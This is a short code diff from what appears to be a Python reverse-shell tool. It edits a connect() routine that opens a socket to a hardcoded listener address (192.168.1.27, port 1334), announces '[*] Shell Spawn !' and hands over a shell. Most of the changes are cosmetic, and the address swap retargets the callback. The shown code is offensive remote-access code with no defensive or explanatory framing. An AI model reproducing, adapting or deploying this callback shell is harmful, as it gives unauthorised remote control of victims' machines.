@@ -55,10 +55,10 @@ def connect(LHOST,LPORT):
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         server_socket.connect((LHOST,LPORT))
-        server_socket.send('[*] Shell Spawn !')
+        server_socket.send('[*] Shell Spawn !\n')
         try:
             shell()
-
+            
         except Exception as error_spawn_shell:
             server_socket.send(error_spawn_shell)
 
@@ -68,7 +68,7 @@ def connect(LHOST,LPORT):
 def main():
     sys_required()
     required_platform()
-    LHOST = '192.168.1.71'
+    LHOST = '192.168.1.27'
     LPORT = 1334
     try:
         connect(LHOST,LPORT)
